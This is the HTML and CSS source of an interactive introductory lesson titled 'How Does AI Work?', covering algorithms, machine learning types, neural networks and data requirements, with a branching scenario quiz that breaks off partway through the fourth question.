.quiz-header {\n    background:var(--surface);\n    border-bottom:1px solid var(--border);\n    padding:16px 24px;\n    display:flex;\n    align-items:center;\n    justify-content:space-between;\n  }\n\n  .quiz-title-bar {\n    font-family:''Space Mono'', monospace;\n    font-size:14px;\n    color:var(--accent);\n    letter-spacing:2px;\n  }\n\n  .quiz-progress {\n    font-size:13px;\n    color:var(--text3);\n    font-family:''Space Mono'', monospace;\n  }\n\n  .quiz-container {\n    flex:1;\n    padding:40px 24px;\n    max-width:760px;\n    margin:0 auto;\n    width:100%;\n  }\n\n  .question-card {\n    background:var(--surface);\n    border:1px solid var(--border);\n    border-radius:12px;\n    padding:32px;\n    margin-bottom:24px;\n    position:relative;\n    display:none;\n  }\n\n  .question-card.active { display:block; animation:fadeSlide 0.4s ease; }\n\n  .question-type {\n    font-family:''Space Mono'', monospace;\n    font-size:11px;\n    letter-spacing:2px;\n    color:var(--accent2);\n    margin-bottom:8px;\n  }\n\n  .question-num {\n    font-size:12px;\n    color:var(--text3);\n    font-family:''Space Mono'', monospace;\n    margin-bottom:16px;\n  }\n\n  .question-text {\n    font-size:18px;\n    font-weight:500;\n    color:var(--text);\n    line-height:1.5;\n    margin-bottom:24px;\n  }\n\n  .scenario-context {\n    background:var(--surface2);\n    border-left:3px solid var(--accent);\n    padding:14px 16px;\n    border-radius:0 6px 6px 0;\n    font-size:14px;\n    color:var(--text2);\n    line-height:1.6;\n    margin-bottom:20px;\n  }\n\n  .options-grid {\n    display:grid;\n    gap:12px;\n  }\n\n  .option-btn {\n    background:var(--surface2);\n    border:1px solid var(--border);\n    border-radius:6px;\n    padding:14px 18px;\n    text-align:left;\n    cursor:pointer;\n    display:flex;\n    align-items:flex-start;\n    gap:14px;\n    transition:all 0.2s;\n    font-family:''DM Sans'', sans-serif;\n    width:100%;\n    color:var(--text2);\n  }\n\n  .option-btn:hover:not(:disabled) {\n    border-color:var(--accent);\n    background:rgba(0,212,255,0.05);\n    color:var(--text);\n    transform:translateX(4px);\n  }\n\n  .option-btn:disabled { cursor:default; }\n  .option-btn.correct { border-color:var(--accent3); background:rgba(16,185,129,0.1); color:var(--text); }\n  .option-btn.wrong { border-color:var(--danger); background:rgba(239,68,68,0.1); }\n  .option-btn.revealed { opacity:0.5; }\n\n  .opt-letter {\n    width:28px;\n    height:28px;\n    border-radius:4px;\n    background:var(--bg);\n    border:1px solid var(--border);\n    display:flex;\n    align-items:center;\n    justify-content:center;\n    font-family:''Space Mono'', monospace;\n    font-size:12px;\n    font-weight:700;\n    flex-shrink:0;\n    transition:all 0.2s;\n  }\n\n  .option-btn.correct .opt-letter { background:var(--accent3); color:white; border-color:var(--accent3); }\n  .option-btn.wrong .opt-letter { background:var(--danger); color:white; border-color:var(--danger); }\n\n  .opt-text { font-size:14px; line-height:1.5; padding-top:2px; }\n\n  /* Feedback panel */\n  .feedback-panel {\n    border-radius:8px;\n    padding:16px 20px;\n    margin-top:16px;\n    display:none;\n    animation:fadeSlide 0.3s ease;\n  }\n\n  .feedback-panel.show { display:block; }\n  .feedback-panel.correct { background:rgba(16,185,129,0.1); border:1px solid var(--accent3); }\n  .feedback-panel.wrong { background:rgba(239,68,68,0.08); border:1px solid var(--danger); }\n\n  .feedback-header {\n    font-family:''Space Mono'', monospace;\n    font-size:13px;\n    font-weight:700;\n    margin-bottom:8px;\n    display:flex;\n    align-items:center;\n    gap:8px;\n  }\n\n  .feedback-panel.correct .feedback-header { color:var(--accent3); }\n  .feedback-panel.wrong .feedback-header { color:var(--danger); }\n\n  .feedback-text { font-size:14px; color:var(--text2); line-height:1.6; }\n\n  /* Branch consequence */\n  .branch-panel {\n    background: linear-gradient(135deg, rgba(124,58,237,0.1), rgba(0,212,255,0.05));\n    border:1px solid var(--accent2);\n    border-radius:8px;\n    padding:20px;\n    margin-top:16px;\n    display:none;\n    animation:fadeSlide 0.3s ease;\n  }\n\n  .branch-panel.show { display:block; }\n\n  .branch-header {\n    font-family:''Space Mono'', monospace;\n    font-size:11px;\n    letter-spacing:2px;\n    color:var(--accent2);\n    margin-bottom:8px;\n  }\n\n  .branch-text { font-size:14px; color:var(--text2); line-height:1.6; }\n\n  .btn-next-question {\n    background: linear-gradient(135deg, var(--accent2), var(--accent));\n    border:none;\n    color:white;\n    padding:12px 28px;\n    border-radius:4px;\n    cursor:pointer;\n    font-family:''DM Sans'', sans-serif;\n    font-size:15px;\n    font-weight:600;\n    margin-top:20px;\n    transition:all 0.2s;\n    display:none;\n  }\n\n  .btn-next-question.show { display:inline-block; }\n  .btn-next-question:hover { transform:translateY(-2px); box-shadow:0 4px 20px rgba(0,212,255,0.3); }\n\n  /* ===== RESULTS SCREEN ===== */\n  #results {\n    align-items:center;\n    justify-content:center;\n    padding:40px 20px;\n    text-align:center;\n    background: radial-gradient(ellipse 80% 60% at 50% 40%, rgba(16,185,129,0.08) 0%, transparent 70%);\n  }\n\n  .score-ring {\n    width:160px;\n    height:160px;\n    border-radius:50%;\n    background: conic-gradient(var(--accent) 0%, var(--accent2) var(--score-pct), var(--surface2) var(--score-pct));\n    display:flex;\n    align-items:center;\n    justify-content:center;\n    margin:0 auto 32px;\n    position:relative;\n  }\n\n  .score-ring::before {\n    content:'''';\n    position:absolute;\n    width:120px;\n    height:120px;\n    background:var(--bg);\n    border-radius:50%;\n  }\n\n  .score-inner {\n    position:relative;\n    z-index:1;\n    font-family:''Space Mono'', monospace;\n  }\n\n  .score-num {\n    font-size:36px;\n    font-weight:700;\n    background:linear-gradient(135deg, var(--accent), var(--accent2));\n    -webkit-background-clip:text;\n    -webkit-text-fill-color:transparent;\n  }\n\n  .score-denom { font-size:14px; color:var(--text3); }\n\n  .results-title {\n    font-size:28px;\n    font-weight:600;\n    margin-bottom:12px;\n    color:var(--text);\n  }\n\n  .results-message {\n    font-size:16px;\n    color:var(--text2);\n    max-width:480px;\n    margin:0 auto 32px;\n    line-height:1.6;\n  }\n\n  .results-breakdown {\n    background:var(--surface);\n    border:1px solid var(--border);\n    border-radius:8px;\n    padding:24px;\n    max-width:560px;\n    margin:0 auto 32px;\n    text-align:left;\n  }\n\n  .breakdown-title {\n    font-family:''Space Mono'', monospace;\n    font-size:12px;\n    letter-spacing:2px;\n    color:var(--accent);\n    margin-bottom:16px;\n  }\n\n  .breakdown-row {\n    display:flex;\n    justify-content:space-between;\n    align-items:center;\n    padding:10px 0;\n    border-bottom:1px solid var(--border);\n    font-size:14px;\n  }\n\n  .breakdown-row:last-child { border-bottom:none; }\n  .breakdown-label { color:var(--text2); }\n  .breakdown-val { font-family:''Space Mono'', monospace; color:var(--text); }\n  .breakdown-val.good { color:var(--accent3); }\n  .breakdown-val.bad { color:var(--danger); }\n\n  .results-actions {\n    display:flex;\n    gap:12px;\n    justify-content:center;\n    flex-wrap:wrap;\n  }\n\n  .btn-action {\n    padding:12px 28px;\n    border-radius:4px;\n    cursor:pointer;\n    font-family:''DM Sans'', sans-serif;\n    font-size:15px;\n    font-weight:600;\n    transition:all 0.2s;\n  }\n\n  .btn-primary {\n    background:linear-gradient(135deg, var(--accent2), var(--accent));\n    border:none;\n    color:white;\n  }\n\n  .btn-secondary {\n    background:transparent;\n    border:1px solid var(--border);\n    color:var(--text2);\n  }\n\n  .btn-primary:hover { transform:translateY(-2px); box-shadow:0 4px 20px rgba(0,212,255,0.3); }\n  .btn-secondary:hover { border-color:var(--accent); color:var(--accent); }\n\n  /* ===== Floating speak fab ===== */\n  .fab-speak {\n    position:fixed;\n    bottom:24px;\n    right:24px;\n    width:52px;\n    height:52px;\n    border-radius:50%;\n    background:linear-gradient(135deg, var(--accent2), var(--accent));\n    border:none;\n    cursor:pointer;\n    display:flex;\n    align-items:center;\n    justify-content:center;\n    font-size:20px;\n    box-shadow:0 4px 20px rgba(0,212,255,0.4);\n    z-index:200;\n    transition:all 0.2s;\n  }\n\n  .fab-speak:hover { transform:scale(1.1); }\n  .fab-speak.speaking { animation:speakPulse 1s ease-in-out infinite; }\n\n  @keyframes speakPulse {\n    0%,100%{ box-shadow:0 4px 20px rgba(0,212,255,0.4); }\n    50%{ box-shadow:0 4px 40px rgba(0,212,255,0.8); }\n  }\n\n  /* ===== Tooltip ===== */\n  .tooltip { position:relative; }\n  .tooltip-text {\n    visibility:hidden;\n    position:absolute;\n    bottom:120%;\n    right:0;\n    background:var(--surface2);\n    border:1px solid var(--border);\n    border-radius:4px;\n    padding:6px 10px;\n    font-size:12px;\n    white-space:nowrap;\n    color:var(--text2);\n    opacity:0;\n    transition:opacity 0.2s;\n    pointer-events:none;\n  }\n  .tooltip:hover .tooltip-text { visibility:visible; opacity:1; }\n\n  /* Responsive */\n  @media (max-width:600px) {\n    .lesson-header { flex-wrap:wrap; height:auto; padding:10px 16px; gap:8px; }\n    .progress-track { max-width:100%; margin:0; order:3; width:100%; }\n    .slide-container { padding:20px 16px; }\n    .nn-visual { padding:12px; gap:8px; }\n    .nn-connector { width:20px; }\n  }\n</style>\n</head>\n<body>\n<div id="app">\n\n<!-- ===== SPLASH ===== -->\n<div id="splash" class="screen active">\n  <div class="institute-badge">M.T.T.I · ICDL PROFESSIONAL</div>\n  <h1 class="splash-title">How Does<br>AI Work?</h1>\n  <p class="splash-sub">Interactive Learning Experience</p>\n  <p class="splash-module">MODULE 2 · ICDL AI FUNDAMENTALS</p>\n  <div class="splash-features">\n    <div class="feature-tag"><span>🎙</span> Voice Narration</div>\n    <div class="feature-tag"><span>🎯</span> Scenario Learning</div>\n    <div class="feature-tag"><span>🌿</span> Branching Quizzes</div>\n    <div class="feature-tag"><span>📊</span> Progress Tracking</div>\n  </div>\n  <button class="btn-start" onclick="startLesson()">BEGIN LESSON →</button>\n</div>\n\n<!-- ===== LESSON ===== -->\n<div id="lesson" class="screen">\n  <div class="lesson-header">\n    <div class="lesson-logo">M.T.T.I · MODULE 2</div>\n    <div class="progress-track">\n      <div class="progress-label">LESSON PROGRESS — <span id="progressLabel">0%</span></div>\n      <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>\n    </div>\n    <div class="nav-buttons">\n      <button class="btn-nav" id="btnPrev" onclick="changeSlide(-1)" disabled>◀ PREV</button>\n      <button class="btn-nav" id="btnNext" onclick="changeSlide(1)">NEXT ▶</button>\n    </div>\n  </div>\n\n  <div class="narration-bar">\n    <div class="narration-icon" onclick="toggleNarration()" id="narrationIcon">🔊</div>\n    <div class="narration-text" id="narrationText">Click 🔊 to hear narration for this slide.</div>\n    <button class="btn-speak tooltip" onclick="toggleNarration()" id="btnSpeak">\n      ▶ NARRATE\n      <span class="tooltip-text">Read this slide aloud</span>\n    </button>\n  </div>\n\n  <div class="slide-container">\n\n    <!-- SLIDE 1: Intro -->\n    <div class="slide active" id="slide-0" data-narration="Welcome to Module 2: How Does AI Work? In this module, we will explore the core principles behind artificial intelligence, including algorithms, machine learning, neural networks, and how AI systems process information to make decisions. By the end of this module, you will understand the building blocks that power every AI system you use today.">\n      <div class="slide-tag">MODULE 2 · INTRODUCTION</div>\n      <h1 class="slide-title">How Does <em>AI Work?</em></h1>\n      <div class="content-block">\n        <h3>🎯 WHAT YOU''LL LEARN</h3>\n        <p>This module breaks down the science behind artificial intelligence — from simple algorithms to complex neural networks. You''ll understand <em>why</em> AI makes decisions, not just <em>what</em> it does.</p>\n      </div>\n      <div class="learning-cards">\n        <div class="learning-card supervised">\n          <div class="card-icon">⚙️</div>\n          <div class="card-title">ALGORITHMS</div>\n          <div class="card-desc">How AI processes step-by-step instructions</div>\n        </div>\n        <div class="learning-card unsupervised">\n          <div class="card-icon">🧠</div>\n          <div class="card-title">MACHINE LEARNING</div>\n          <div class="card-desc">3 types of learning from data</div>\n        </div>\n        <div class="learning-card reinforcement">\n          <div class="card-icon">🔗</div>\n          <div class="card-title">NEURAL NETWORKS</div>\n          <div class="card-desc">Brain-inspired AI architecture</div>\n        </div>\n      </div>\n    </div>\n\n    <!-- SLIDE 2: Algorithms -->\n    <div class="slide" id="slide-1" data-narration="Let''s start with algorithms. An algorithm is a step-by-step procedure for solving a problem. Think of baking a cake: you follow a recipe — first mix ingredients, then bake, then cool. A computer algorithm works the same way. But here''s where AI is different. Traditional algorithms follow fixed, human-written rules. AI algorithms, however, learn the rules themselves from examples. For instance, instead of a programmer writing every rule for recognizing a cat, an AI looks at thousands of cat images and learns what patterns make a cat a cat.">\n      <div class="slide-tag">SECTION 2.1</div>\n      <h2 class="slide-title">Algorithms & <em>How AI Differs</em></h2>\n      <div class="content-block">\n        <h3>🔢 WHAT IS AN ALGORITHM?</h3>\n        <p>A step-by-step procedure for solving a problem. Traditional algorithms follow <strong>human-written rules</strong>. AI algorithms <strong>learn the rules from data</strong>.</p>\n      </div>\n      <div class="scenario-box">\n        <div class="scenario-label">📖 REAL EXAMPLE</div>\n        <div class="scenario-title">Making Tea vs. AI Learning</div>\n        <div class="scenario-text">\n          <strong>Traditional Algorithm:</strong> Boil water → Add tea bag → Wait 4 minutes → Remove bag. Every step is fixed by a human.<br><br>\n          <strong>AI Algorithm:</strong> Show 10,000 images of tea. AI <em>discovers</em> what makes tea look like tea — color, transparency, steam — without being told.\n        </div>\n      </div>\n      <div class="content-block">\n        <h3>🤔 WHY DOES THIS MATTER?</h3>\n        <p>AI can handle problems too complex to write rules for. No human could write rules for every face — but AI can recognize billions of faces by learning from examples.</p>\n      </div>\n    </div>\n\n    <!-- SLIDE 3: Processing Pipeline -->\n    <div class="slide" id="slide-2" data-narration="Every AI system processes information through a pipeline — a series of stages that transform raw data into a useful result. First, data is input into the system — this could be text, images, numbers, or audio. Then the data is cleaned and prepared. Next, the AI extracts important features — for an image, this might be edges or colors. After that, the AI recognizes patterns in those features. Finally, it makes a decision or prediction and delivers an output. This pipeline is the foundation of every AI application you use, from voice assistants to recommendation systems.">\n      <div class="slide-tag">SECTION 2.2</div>\n      <h2 class="slide-title">The AI <em>Processing Pipeline</em></h2>\n      <div class="content-block">\n        <h3>🔄 HOW AI PROCESSES INFORMATION</h3>\n        <p>Every AI system — from ChatGPT to a spam filter — follows this same pipeline when turning raw data into useful results:</p>\n        <div class="pipeline">\n          <div class="pipeline-step">\n            <div class="step-num">1</div>\n            <div class="step-text"><strong>Data Input</strong>Text, images, audio, numbers</div>\n          </div>\n          <div class="pipeline-step">\n            <div class="step-num">2</div>\n            <div class="step-text"><strong>Data Processing</strong>Clean & prepare data</div>\n          </div>\n          <div class="pipeline-step">\n            <div class="step-num">3</div>\n            <div class="step-text"><strong>Feature Extraction</strong>Find key characteristics</div>\n          </div>\n          <div class="pipeline-step">\n            <div class="step-num">4</div>\n            <div class="step-text"><strong>Pattern Recognition</strong>Identify patterns</div>\n          </div>\n          <div class="pipeline-step">\n            <div class="step-num">5</div>\n            <div class="step-text"><strong>Decision / Prediction</strong>Make a choice</div>\n          </div>\n          <div class="pipeline-step">\n            <div class="step-num">6</div>\n            <div class="step-text"><strong>Output</strong>Deliver the result</div>\n          </div>\n        </div>\n      </div>\n      <div class="scenario-box">\n        <div class="scenario-label">💡 PIPELINE IN ACTION</div>\n        <div class="scenario-title">Spam Email Detection</div>\n        <div class="scenario-text">Input: You receive an email → Processing: AI reads subject & body → Features: Finds words like "FREE!" and "Click now!" → Patterns: Matches known spam patterns → Decision: "This is spam" → Output: Email moved to Junk folder.</div>\n      </div>\n    </div>\n\n    <!-- SLIDE 4: 3 Types of ML -->\n    <div class="slide" id="slide-3" data-narration="Machine Learning is the heart of modern AI. Instead of following fixed rules, it learns from data. There are three main types. First is Supervised Learning — the AI learns from labeled examples, like a student with a teacher. For example, showing the AI thousands of emails labeled spam or not spam. Second is Unsupervised Learning — the AI finds hidden patterns in unlabeled data, like exploring without a map. A business might use this to discover natural customer groups. Third is Reinforcement Learning — the AI learns through trial and error, receiving rewards for good actions, like training a dog with treats. AlphaGo, the AI that defeated the world Go champion, used this method.">\n      <div class="slide-tag">SECTION 2.3 – 2.4</div>\n      <h2 class="slide-title">Three Types of <em>Machine Learning</em></h2>\n      <div class="learning-cards">\n        <div class="learning-card supervised">\n          <div class="card-icon">👨‍🏫</div>\n          <div class="card-title">SUPERVISED</div>\n          <div class="card-desc">Learns from <strong>labeled examples</strong>. Like a student with a teacher who gives correct answers.</div>\n          <div class="card-example">📧 Email spam filter: AI trained on "spam" and "not spam" emails</div>\n        </div>\n        <div class="learning-card unsupervised">\n          <div class="card-icon">🗺️</div>\n          <div class="card-title">UNSUPERVISED</div>\n          <div class="card-desc">Finds hidden patterns in <strong>unlabeled data</strong>. Like exploring a new city without a map.</div>\n          <div class="card-example">🛒 Customer segmentation: Groups buyers with similar habits</div>\n        </div>\n        <div class="learning-card reinforcement">\n          <div class="card-icon">🎮</div>\n          <div class="card-title">REINFORCEMENT</div>\n          <div class="card-desc">Learns through <strong>trial and error</strong> with rewards & penalties. Like training a dog with treats.</div>\n          <div class="card-example">♟️ AlphaGo: Played millions of games, won rewards for winning moves</div>\n        </div>\n      </div>\n      <div class="content-block" style="margin-top:20px">\n        <h3>🔑 KEY INSIGHT</h3>\n        <p>Most AI tools you use today — ChatGPT, Google Translate, Netflix — use a combination of these learning types. Supervised learning during training, reinforcement learning to improve from feedback.</p>\n      </div>\n    </div>\n\n    <!-- SLIDE 5: Neural Networks -->\n    <div class="slide" id="slide-4" data-narration="Neural networks are AI systems inspired by the structure of the human brain. They consist of interconnected nodes — called neurons — organized in layers. The first layer is the input layer, which receives raw data. Hidden layers in the middle process and transform this data through mathematical operations. The output layer produces the final result. Here''s how neural networks learn: they start with random connections. During training, the network processes thousands of examples, compares its guesses to the correct answers, and adjusts connection strengths to reduce errors. After millions of repetitions, the network becomes accurate at recognizing patterns.">\n      <div class="slide-tag">SECTION 2.5</div>\n      <h2 class="slide-title">Neural Networks — <em>The AI Brain</em></h2>\n      <div class="content-block">\n        <h3>🧠 INSPIRED BY THE HUMAN BRAIN</h3>\n        <p>Neural networks consist of interconnected <strong>nodes (neurons)</strong> organized in layers. Data flows through the layers, transforming at each step until a final answer emerges.</p>\n      </div>\n      <div class="nn-visual">\n        <div class="nn-layer">\n          <div class="nn-label" style="color:var(--accent)">INPUT<br>LAYER</div>\n          <div class="nn-node input">X₁</div>\n          <div class="nn-node input">X₂</div>\n          <div class="nn-node input">X₃</div>\n          <div class="nn-node input">X₄</div>\n        </div>\n        <div class="nn-connector"></div>\n        <div class="nn-layer">\n          <div class="nn-label" style="color:var(--accent2)">HIDDEN<br>LAYER 1</div>\n          <div class="nn-node hidden">H₁</div>\n          <div class="nn-node hidden">H₂</div>\n          <div class="nn-node hidden">H₃</div>\n          <div class="nn-node hidden">H₄</div>\n          <div class="nn-node hidden">H₅</div>\n        </div>\n        <div class="nn-connector"></div>\n        <div class="nn-layer">\n          <div class="nn-label" style="color:var(--accent3)">HIDDEN<br>LAYER 2</div>\n          <div class="nn-node hidden2">H₆</div>\n          <div class="nn-node hidden2">H₇</div>\n          <div class="nn-node hidden2">H₈</div>\n          <div class="nn-node hidden2">H₉</div>\n        </div>\n        <div class="nn-connector"></div>\n        <div class="nn-layer">\n          <div class="nn-label" style="color:var(--warn)">OUTPUT<br>LAYER</div>\n          <div class="nn-node output">🐱</div>\n          <div class="nn-node output">🐶</div>\n          <div class="nn-node output">🚗</div>\n        </div>\n      </div>\n      <div class="scenario-box" style="margin-top:20px">\n        <div class="scenario-label">🔍 HOW LEARNING HAPPENS</div>\n        <div class="scenario-title">The Training Loop</div>\n        <div class="scenario-text">① Random connections set → ② Process a training example → ③ Compare output to correct answer → ④ Adjust connection strengths to reduce error → ⑤ Repeat millions of times → ✅ Network becomes accurate</div>\n      </div>\n    </div>\n\n    <!-- SLIDE 6: Deep Learning -->\n    <div class="slide" id="slide-5" data-narration="Deep Learning is simply a neural network with many layers — that''s why it''s called ''deep''. More layers allow the AI to learn more complex patterns. Consider image recognition. The first layer might detect basic edges and shapes. The second layer combines these into patterns like circles and rectangles. The third layer recognizes parts — eyes, wheels, windows. The fourth layer identifies complete objects — faces, cars, buildings. This is why deep learning powers breakthroughs in image recognition, speech recognition, and language models like the one behind ChatGPT. The more layers and data, the more capable the AI becomes.">\n      <div class="slide-tag">SECTION 2.6</div>\n      <h2 class="slide-title">Deep Learning — <em>Going Deeper</em></h2>\n      <div class="content-block">\n        <h3>⚡ WHY "DEEP"?</h3>\n        <p>Deep Learning uses neural networks with <strong>many layers</strong>. Each layer learns increasingly abstract features from the data. More layers = ability to learn more complex patterns.</p>\n      </div>\n      <div class="content-block">\n        <h3>🖼️ IMAGE RECOGNITION: LAYER BY LAYER</h3>\n        <table class="data-table">\n          <tr><th>LAYER</th><th>WHAT IT DETECTS</th><th>EXAMPLE</th></tr>\n          <tr><td>Layer 1</td><td>Edges & basic shapes</td><td>Lines, curves, gradients</td></tr>\n          <tr><td>Layer 2</td><td>Simple patterns</td><td>Circles, rectangles, textures</td></tr>\n          <tr><td>Layer 3</td><td>Object parts</td><td>Eyes, wheels, windows</td></tr>\n          <tr><td>Layer 4+</td><td>Complete objects</td><td>Faces, cars, buildings</td></tr>\n        </table>\n      </div>\n      <div class="content-block">\n        <h3>💡 POWERED BY DEEP LEARNING TODAY</h3>\n        <p>ChatGPT, Google Photos face recognition, Siri voice commands, YouTube video recommendations, self-driving cars — all rely on deep learning with millions of parameters across hundreds of layers.</p>\n      </div>\n    </div>\n\n    <!-- SLIDE 7: Data Requirements -->\n    <div class="slide" id="slide-6" data-narration="AI needs data the way humans need education. The quality and quantity of data directly determine how well an AI performs. There are five key requirements for good AI data. Volume — AI needs thousands to millions of examples to learn from. Quality — the data must be accurate and consistent, because garbage in means garbage out. Diversity — the data must represent all the real-world scenarios the AI will encounter. Relevance — the data must actually relate to the problem being solved. And Balance — different categories should be equally represented, or the AI will develop biases. A poorly trained AI in healthcare could misdiagnose patients, so data quality is literally life-or-death in some applications.">\n      <div class="slide-tag">SECTION 2.8</div>\n      <h2 class="slide-title">Data — <em>The Fuel of AI</em></h2>\n      <div class="scenario-box">\n        <div class="scenario-label">💡 KEY INSIGHT</div>\n        <div class="scenario-title">AI needs data like humans need education</div>\n        <div class="scenario-text">The more high-quality, diverse, relevant data an AI has, the better it performs. Poor data = poor AI — no matter how advanced the algorithm.</div>\n      </div>\n      <div class="content-block">\n        <h3>📋 5 KEY DATA REQUIREMENTS</h3>\n        <table class="data-table">\n          <tr><th>REQUIREMENT</th><th>WHY IT MATTERS</th></tr>\n          <tr><td><strong>Volume</strong></td><td>Thousands to millions of examples needed</td></tr>\n          <tr><td><strong>Quality</strong></td><td>Garbage data → garbage AI performance</td></tr>\n          <tr><td><strong>Diversity</strong></td><td>Must represent all real-world scenarios</td></tr>\n          <tr><td><strong>Relevance</strong></td><td>Must directly relate to the problem</td></tr>\n          <tr><td><strong>Balance</strong></td><td>Equal representation prevents biased AI</td></tr>\n        </table>\n      </div>\n      <div class="content-block">\n        <h3>⚠️ DATA QUALITY ISSUES</h3>\n        <p>Biased data leads to biased AI decisions. Unbalanced data creates unfair predictions. Outdated data makes AI irrelevant. This is why data engineers are among the most important people in AI development.</p>\n      </div>\n    </div>\n\n    <!-- SLIDE 8: Quiz Intro -->\n    <div class="slide" id="slide-7" data-narration="Excellent work completing Module 2! You''ve learned about algorithms, the AI processing pipeline, three types of machine learning, neural networks, deep learning, and data requirements. Now it''s time to test your understanding with a branching scenario quiz. Each question puts you in a real-world situation. Based on your answers, you''ll follow different learning paths — just like real AI systems that adapt to your responses. There are 6 questions. Good luck!">\n      <div class="slide-tag">ASSESSMENT</div>\n      <h2 class="slide-title">Ready for the <em>Quiz?</em></h2>\n      <div class="content-block">\n        <h3>🎯 MODULE 2 RECAP</h3>\n        <p>You''ve covered: Algorithms & how AI differs from traditional programs · The 6-step AI processing pipeline · 3 types of Machine Learning · Neural network structure & learning · Deep learning layers · Data requirements for AI</p>\n      </div>\n      <div class="scenario-box">\n        <div class="scenario-label">🌿 BRANCHING QUIZ FORMAT</div>\n        <div class="scenario-title">How the Quiz Works</div>\n        <div class="scenario-text">\n          Each question presents a <strong>real-world scenario</strong>. Your answer determines which follow-up explanation and path you receive — just like a branching story. Some questions have <strong>consequence paths</strong> that show the impact of your decision in context. There are <strong>6 questions</strong> worth a total of <strong>12 points</strong>.\n        </div>\n      </div>\n      <div style="text-align:center; margin-top:32px">\n        <button class="btn-start" onclick="startQuiz()">START QUIZ →</button>\n      </div>\n    </div>\n\n  </div><!-- /slide-container -->\n</div><!-- /lesson -->\n\n<!-- ===== QUIZ ===== -->\n<div id="quiz" class="screen">\n  <div class="quiz-header">\n    <div class="quiz-title-bar">MODULE 2 · SCENARIO QUIZ</div>\n    <div class="quiz-progress" id="quizProgressLabel">Question 1 of 6</div>\n  </div>\n\n  <div class="quiz-container">\n    <!-- Q1 -->\n    <div class="question-card active" id="q1">\n      <div class="question-type">SCENARIO QUESTION</div>\n      <div class="question-num">QUESTION 1 OF 6</div>\n      <div class="scenario-context">\n        🏥 <strong>Scenario:</strong> Dr. Amina wants to build an AI that detects pneumonia from chest X-rays. She''s deciding how to structure her AI system''s processing. A patient''s X-ray image arrives at the AI system.\n      </div>\n      <div class="question-text">What is the FIRST step the AI processing pipeline performs on this X-ray image?</div>\n      <div class="options-grid" id="q1-options">\n        <button class="option-btn" onclick="answerQ(1,''A'')"><span class="opt-letter">A</span><span class="opt-text">Make an immediate diagnosis — the AI outputs "pneumonia detected" right away</span></button>\n        <button class="option-btn" onclick="answerQ(1,''B'')"><span class="opt-letter">B</span><span class="opt-text">Data Input — receive the image file (pixels, resolution, format)</span></button>\n        <button class="option-btn" onclick="answerQ(1,''C'')"><span class="opt-letter">C</span><span class="opt-text">Pattern Recognition — scan for white patches in the lungs</span></button>\n        <button class="option-btn" onclick="answerQ(1,''D'')"><span class="opt-letter">D</span><span class="opt-text">Feature Extraction — immediately identify relevant medical features</span></button>\n      </div>\n      <div class="feedback-panel" id="q1-feedback"></div>\n      <div class="branch-panel" id="q1-branch"></div>\n      <button class="btn-next-question" id="q1-next" onclick="nextQuestion(2)">NEXT QUESTION →</button>\n    </div>\n\n    <!-- Q2 -->\n    <div class="question-card" id="q2">\n      <div class="question-type">CLASSIFICATION QUESTION</div>\n      <div class="question-num">QUESTION 2 OF 6</div>\n      <div class="scenario-context">\n        📬 <strong>Scenario:</strong> Safaricom''s IT team is building an email security system. They have 500,000 past emails, each labeled as either "phishing" or "legitimate". They feed these labeled emails to train their AI.\n      </div>\n      <div class="question-text">Which type of Machine Learning is Safaricom''s team using?</div>\n      <div class="options-grid" id="q2-options">\n        <button class="option-btn" onclick="answerQ(2,''A'')"><span class="opt-letter">A</span><span class="opt-text">Unsupervised Learning — the AI finds its own patterns without labels</span></button>\n        <button class="option-btn" onclick="answerQ(2,''B'')"><span class="opt-letter">B</span><span class="opt-text">Reinforcement Learning — the AI wins a prize for blocking phishing emails</span></button>\n        <button class="option-btn" onclick="answerQ(2,''C'')"><span class="opt-letter">C</span><span class="opt-text">Supervised Learning — the AI learns from labeled examples (phishing/legitimate)</span></button>\n        <button class="option-btn" onclick="answerQ(2,''D'')"><span class="opt-letter">D</span><span class="opt-text">Deep Learning — it uses many neural network layers to process emails</span></button>\n      </div>\n      <div class="feedback-panel" id="q2-feedback"></div>\n      <div class="branch-panel" id="q2-branch"></div>\n      <button class="btn-next-question" id="q2-next" onclick="nextQuestion(3)">NEXT QUESTION →</button>\n    </div>\n\n    <!-- Q3 -->\n    <div class="question-card" id="q3">\n      <div class="question-type">SCENARIO QUESTION</div>\n      <div class="question-num">QUESTION 3 OF 6</div>\n      <div class="scenario-context">\n        🎮 <strong>Scenario:</strong> James is training an AI to play the Kenyan card game "Karata". There are no labeled examples of "good moves" or "bad moves". Instead, the AI plays millions of games against itself. When it wins, it gets a positive signal. When it loses, a negative signal.\n      </div>\n      <div class="question-text">Which type of Machine Learning is James using, and why is it the right choice here?</div>\n      <div class="options-grid" id="q3-options">\n        <button class="option-btn" onclick="answerQ(3,''A'')"><span class="opt-letter">A</span><span class="opt-text">Supervised Learning — because James can label every card move as correct or incorrect</span></button>\n        <button class="option-btn" onclick="answerQ(3,''B'')"><span class="opt-letter">B</span><span class="opt-text">Reinforcement Learning — because the AI learns from rewards (wins) and penalties (losses) through trial and error</span></button>\n        <button class="option-btn" onclick="answerQ(3,''C'')"><span class="opt-letter">C</span><span class="opt-text">Unsupervised Learning — because the AI is grouping similar card hands together</span></button>\n        <button class="option-btn" onclick="answerQ(3,''D'')"><span class="opt-letter">D</span><span class="opt-text">Feature Extraction — because the AI needs to identify key card features first</span></button>\n      </div>\n      <div class="feedback-panel" id="q3-feedback"></div>\n      <div class="branch-panel" id="q3-branch"></div>\n      <button class="btn-next-question" id="q3-next" onclick="nextQuestion(4)">NEXT QUESTION →</button>\n    </div>\n\n    <!-- Q4 -->\n    <div class="question-card" id="q4">\n      <div class="question-type">NEURAL NETWORK QUESTION</div>\n      <div class="question-num">QUESTION 4 OF 6</div>\n      <div class="scenario-context">\n        📸 <strong>Scenario:</strong> Grace''s neural network is learning to recognize Maasai traditional clothing in photos. The network has 4 layers. Layer 1 detects lines and color edges. Layer 2 identifies geometric shapes and patterns. Layer 3 recognizes clothing parts (collar, beading, fabric folds). Layer 4 outputs: "Maasai clothing" or "not Maasai clothing."\n      </div>\n      <div class="question-text">What concept does Grace''s network demonstrate, and which layer type is Layer 4?</div>\n      <div class="options-grid" id="q4-options">\n        <button class="option-btn" onclick="answerQ(4,''A'')"><span class="opt-letter">A</span><span class="opt-text">Simple algorithms — Layer 4 is the Input Layer receiving raw image data</span></button>\n        <button class="option-btn" onclick="answerQ(4,''B'')"><span class="opt-letter">B</span><span class="opt-text">Deep Learning''s hierarchical feature learning — Layer 4 is the Output Layer</span></button>\n        <button class="option-btn" onclick="answerQ(4,''C'')"><span 